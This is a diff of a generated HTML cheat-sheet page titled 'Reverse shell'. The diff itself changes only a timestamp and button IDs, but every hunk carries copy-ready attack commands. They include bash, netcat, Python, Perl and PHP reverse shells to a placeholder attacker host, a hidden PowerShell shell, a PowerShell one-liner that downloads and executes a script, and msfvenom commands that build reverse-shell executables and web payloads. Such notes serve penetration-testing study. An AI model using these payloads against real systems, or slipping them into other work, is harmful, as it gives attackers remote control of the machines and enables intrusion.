@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 14:09 -->
+<!-- 2026-07-20 Mon 15:38 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Reverse shell</title>
@@ -903,11 +903,11 @@ Related: <a href="../org/20260314T005725--webshell__concept_cybersecurity.html">
 <h2 id="org582ce1a">1. Listener — Always Start First</h2>
 <div class="outline-text-2" id="text-org582ce1a">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_05e69e00e0254ae8a7a25f0d400203e8>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3b02b9a91c3343ce8a5a500e4695460f>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_05e69e00e0254ae8a7a25f0d400203e8=document.querySelector('button[name=btn_05e69e00e0254ae8a7a25f0d400203e8]');
-copyBtnbtn_05e69e00e0254ae8a7a25f0d400203e8.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Basic netcat listener\nnc -lvnp 4444\n\n# rlwrap for arrow keys and history (recommended)\nrlwrap nc -lvnp 4444\n`);copyBtnbtn_05e69e00e0254ae8a7a25f0d400203e8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_05e69e00e0254ae8a7a25f0d400203e8.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_3b02b9a91c3343ce8a5a500e4695460f=document.querySelector('button[name=btn_3b02b9a91c3343ce8a5a500e4695460f]');
+copyBtnbtn_3b02b9a91c3343ce8a5a500e4695460f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Basic netcat listener\nnc -lvnp 4444\n\n# rlwrap for arrow keys and history (recommended)\nrlwrap nc -lvnp 4444\n`);copyBtnbtn_3b02b9a91c3343ce8a5a500e4695460f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3b02b9a91c3343ce8a5a500e4695460f.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -924,11 +924,11 @@ let res = copyTextToClipboard(`# Basic netcat listener\nnc -lvnp 4444\n\n# rlwra
 <h2 id="orgb978808">2. Linux Payloads</h2>
 <div class="outline-text-2" id="text-orgb978808">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7b5eb1663279402a991cbf4f9810c1e2>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f42126a669b643359e5501ed30a1ff8d>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7b5eb1663279402a991cbf4f9810c1e2=document.querySelector('button[name=btn_7b5eb1663279402a991cbf4f9810c1e2]');
-copyBtnbtn_7b5eb1663279402a991cbf4f9810c1e2.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Bash TCP — most reliable on Linux\nbash -i >& /dev/tcp/$ATTACKER/4444 0>&1\n\n# URL-encoded (for webshell delivery via curl)\nbash+-c+'bash+-i+>%26+/dev/tcp/$ATTACKER/4444+0>%261'\n\n# Bash alternative if >& is filtered\nbash -i > /dev/tcp/$ATTACKER/4444 0<&1 2>&1\n\n# Netcat with -e (if available)\nnc -e /bin/bash $ATTACKER 4444\n\n# Netcat without -e (BusyBox / stripped nc)\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $ATTACKER 4444 > /tmp/f\n\n# Python 3\npython3 -c 'import socket,subprocess,os;\ns=socket.socket();s.connect((\"$ATTACKER\",4444));\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);\nsubprocess.call([\"/bin/bash\",\"-i\"])'\n\n# Python 2\npython -c 'import socket,subprocess,os;\ns=socket.socket();s.connect((\"$ATTACKER\",4444));\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);\nsubprocess.call([\"/bin/sh\",\"-i\"])'\n\n# Perl\nperl -e 'use Socket;$i=\"$ATTACKER\";$p=4444;\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nconnect(S,sockaddr_in($p,inet_aton($i)));\nopen(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");\nexec(\"/bin/bash -i\");'\n\n# PHP (useful directly in webshell context)\nphp -r '$sock=fsockopen(\"$ATTACKER\",4444);\nexec(\"/bin/bash -i <&3 >&3 2>&3\");'\n`);copyBtnbtn_7b5eb1663279402a991cbf4f9810c1e2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7b5eb1663279402a991cbf4f9810c1e2.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f42126a669b643359e5501ed30a1ff8d=document.querySelector('button[name=btn_f42126a669b643359e5501ed30a1ff8d]');
+copyBtnbtn_f42126a669b643359e5501ed30a1ff8d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Bash TCP — most reliable on Linux\nbash -i >& /dev/tcp/$ATTACKER/4444 0>&1\n\n# URL-encoded (for webshell delivery via curl)\nbash+-c+'bash+-i+>%26+/dev/tcp/$ATTACKER/4444+0>%261'\n\n# Bash alternative if >& is filtered\nbash -i > /dev/tcp/$ATTACKER/4444 0<&1 2>&1\n\n# Netcat with -e (if available)\nnc -e /bin/bash $ATTACKER 4444\n\n# Netcat without -e (BusyBox / stripped nc)\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $ATTACKER 4444 > /tmp/f\n\n# Python 3\npython3 -c 'import socket,subprocess,os;\ns=socket.socket();s.connect((\"$ATTACKER\",4444));\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);\nsubprocess.call([\"/bin/bash\",\"-i\"])'\n\n# Python 2\npython -c 'import socket,subprocess,os;\ns=socket.socket();s.connect((\"$ATTACKER\",4444));\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);\nsubprocess.call([\"/bin/sh\",\"-i\"])'\n\n# Perl\nperl -e 'use Socket;$i=\"$ATTACKER\";$p=4444;\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nconnect(S,sockaddr_in($p,inet_aton($i)));\nopen(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");\nexec(\"/bin/bash -i\");'\n\n# PHP (useful directly in webshell context)\nphp -r '$sock=fsockopen(\"$ATTACKER\",4444);\nexec(\"/bin/bash -i <&3 >&3 2>&3\");'\n`);copyBtnbtn_f42126a669b643359e5501ed30a1ff8d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f42126a669b643359e5501ed30a1ff8d.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -977,11 +977,11 @@ exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
 <h2 id="org159e50d">3. Windows Payloads</h2>
 <div class="outline-text-2" id="text-org159e50d">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_75cbf489b2a3428381f6e6cd062f2a38>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_15e47dd7b3ce4d218473d297c8ea4450>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_75cbf489b2a3428381f6e6cd062f2a38=document.querySelector('button[name=btn_75cbf489b2a3428381f6e6cd062f2a38]');
-copyBtnbtn_75cbf489b2a3428381f6e6cd062f2a38.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# PowerShell — most reliable on modern Windows\npowershell -NoP -NonI -W Hidden -Exec Bypass -c \\\n  \"$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER',4444);\n  $stream = $client.GetStream();\n  [byte[]]$bytes = 0..65535|%{0};\n  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);\n    $sendback = (iex $data 2>&1 | Out-String);\n    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n    $stream.Write($sendbyte,0,$sendbyte.Length);\n    $stream.Flush()};$client.Close()\"\n\n# PowerShell one-liner — download and execute hosted script\npowershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://$ATTACKER/rev.ps1')\"\n\n# Invoke-PowerShellTcp.ps1 (Nishang) — host and call\n# Add to end of file: Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER -Port 4444\n\n# Netcat for Windows\n.\\nc.exe -e cmd.exe $ATTACKER 4444\n`);copyBtnbtn_75cbf489b2a3428381f6e6cd062f2a38.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_75cbf489b2a3428381f6e6cd062f2a38.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_15e47dd7b3ce4d218473d297c8ea4450=document.querySelector('button[name=btn_15e47dd7b3ce4d218473d297c8ea4450]');
+copyBtnbtn_15e47dd7b3ce4d218473d297c8ea4450.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# PowerShell — most reliable on modern Windows\npowershell -NoP -NonI -W Hidden -Exec Bypass -c \\\n  \"$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER',4444);\n  $stream = $client.GetStream();\n  [byte[]]$bytes = 0..65535|%{0};\n  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);\n    $sendback = (iex $data 2>&1 | Out-String);\n    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n    $stream.Write($sendbyte,0,$sendbyte.Length);\n    $stream.Flush()};$client.Close()\"\n\n# PowerShell one-liner — download and execute hosted script\npowershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://$ATTACKER/rev.ps1')\"\n\n# Invoke-PowerShellTcp.ps1 (Nishang) — host and call\n# Add to end of file: Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER -Port 4444\n\n# Netcat for Windows\n.\\nc.exe -e cmd.exe $ATTACKER 4444\n`);copyBtnbtn_15e47dd7b3ce4d218473d297c8ea4450.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_15e47dd7b3ce4d218473d297c8ea4450.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1014,11 +1014,11 @@ let res = copyTextToClipboard(`# PowerShell — most reliable on modern Windows\
 <h2 id="orgdd0dd7a">4. Msfvenom Payloads</h2>
 <div class="outline-text-2" id="text-orgdd0dd7a">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7ea373a547b94d0c8a845eef8a7be819>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ce3089ed21ee477aab5ea3fecbd617b0>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7ea373a547b94d0c8a845eef8a7be819=document.querySelector('button[name=btn_7ea373a547b94d0c8a845eef8a7be819]');
-copyBtnbtn_7ea373a547b94d0c8a845eef8a7be819.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f elf -o shell.elf\n\n# Windows EXE\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f exe -o shell.exe\n\n# Windows Meterpreter\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ATTACKER LPORT=4444 -f exe -o meter.exe\n\n# ASPX (IIS)\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f aspx -o shell.aspx\n\n# PHP\nmsfvenom -p php/reverse_php LHOST=$ATTACKER LPORT=4444 -f raw -o shell.php\n\n# WAR (Tomcat)\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f war -o shell.war\n`);copyBtnbtn_7ea373a547b94d0c8a845eef8a7be819.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7ea373a547b94d0c8a845eef8a7be819.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ce3089ed21ee477aab5ea3fecbd617b0=document.querySelector('button[name=btn_ce3089ed21ee477aab5ea3fecbd617b0]');
+copyBtnbtn_ce3089ed21ee477aab5ea3fecbd617b0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f elf -o shell.elf\n\n# Windows EXE\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f exe -o shell.exe\n\n# Windows Meterpreter\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ATTACKER LPORT=4444 -f exe -o meter.exe\n\n# ASPX (IIS)\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f aspx -o shell.aspx\n\n# PHP\nmsfvenom -p php/reverse_php LHOST=$ATTACKER LPORT=4444 -f raw -o shell.php\n\n# WAR (Tomcat)\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f war -o shell.war\n`);copyBtnbtn_ce3089ed21ee477aab5ea3fecbd617b0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ce3089ed21ee477aab5ea3fecbd617b0.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1055,11 +1055,11 @@ Raw reverse shells have no tab completion, no arrow keys, and
 <h3 id="org81ade93">Python PTY (Linux — most common)</h3>
 <div class="outline-text-3" id="text-org81ade93">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d161e9fd90864ab4b68e7e3e9f98d040>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_31acdbc056fe4c7a8e2663c820d4da59>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_d161e9fd90864ab4b68e7e3e9f98d040=document.querySelector('button[name=btn_d161e9fd90864ab4b68e7e3e9f98d040]');
-copyBtnbtn_d161e9fd90864ab4b68e7e3e9f98d040.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# On target\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Ctrl+Z to background\nstty raw -echo; fg\n# Press Enter twice\nexport TERM=xterm\n`);copyBtnbtn_d161e9fd90864ab4b68e7e3e9f98d040.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d161e9fd90864ab4b68e7e3e9f98d040.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_31acdbc056fe4c7a8e2663c820d4da59=document.querySelector('button[name=btn_31acdbc056fe4c7a8e2663c820d4da59]');
+copyBtnbtn_31acdbc056fe4c7a8e2663c820d4da59.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# On target\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Ctrl+Z to background\nstty raw -echo; fg\n# Press Enter twice\nexport TERM=xterm\n`);copyBtnbtn_31acdbc056fe4c7a8e2663c820d4da59.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_31acdbc056fe4c7a8e2663c820d4da59.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1077,11 +1077,11 @@ let res = copyTextToClipboard(`# On target\npython3 -c 'import pty; pty.spawn(\"
 <h3 id="orga70a48f">rlwrap (before connecting)</h3>
 <div class="outline-text-3" id="text-orga70a48f">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_9484c0982fee45a5bf99e697e05cc442>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b7dfad3b43fc43d4907b6ce3ffd6a38d>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_9484c0982fee45a5bf99e697e05cc442=document.querySelector('button[name=btn_9484c0982fee45a5bf99e697e05cc442]');
-copyBtnbtn_9484c0982fee45a5bf99e697e05cc442.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`rlwrap nc -lvnp 4444\n# Provides readline — arrows and history work without further steps\n`);copyBtnbtn_9484c0982fee45a5bf99e697e05cc442.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9484c0982fee45a5bf99e697e05cc442.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_b7dfad3b43fc43d4907b6ce3ffd6a38d=document.querySelector('button[name=btn_b7dfad3b43fc43d4907b6ce3ffd6a38d]');
+copyBtnbtn_b7dfad3b43fc43d4907b6ce3ffd6a38d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`rlwrap nc -lvnp 4444\n# Provides readline — arrows and history work without further steps\n`);copyBtnbtn_b7dfad3b43fc43d4907b6ce3ffd6a38d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b7dfad3b43fc43d4907b6ce3ffd6a38d.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1095,11 +1095,11 @@ let res = copyTextToClipboard(`rlwrap nc -lvnp 4444\n# Provides readline — arr
 <h3 id="org92decfc">socat (full TTY — best result)</h3>
 <div class="outline-text-3" id="text-org92decfc">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_99e420a73d3a44ba82301ad5f033c468>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_9bf6fede69e641e1862703a25d78edc0>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_99e420a73d3a44ba82301ad5f033c468=document.querySelector('button[name=btn_99e420a73d3a44ba82301ad5f033c468]');
-copyBtnbtn_99e420a73d3a44ba82301ad5f033c468.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Attacker — listen\nsocat file:\`tty\`,raw,echo=0 tcp-listen:4444\n\n# Target — connect\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ATTACKER:4444\n`);copyBtnbtn_99e420a73d3a44ba82301ad5f033c468.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_99e420a73d3a44ba82301ad5f033c468.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_9bf6fede69e641e1862703a25d78edc0=document.querySelector('button[name=btn_9bf6fede69e641e1862703a25d78edc0]');
+copyBtnbtn_9bf6fede69e641e1862703a25d78edc0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Attacker — listen\nsocat file:\`tty\`,raw,echo=0 tcp-listen:4444\n\n# Target — connect\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ATTACKER:4444\n`);copyBtnbtn_9bf6fede69e641e1862703a25d78edc0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9bf6fede69e641e1862703a25d78edc0.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
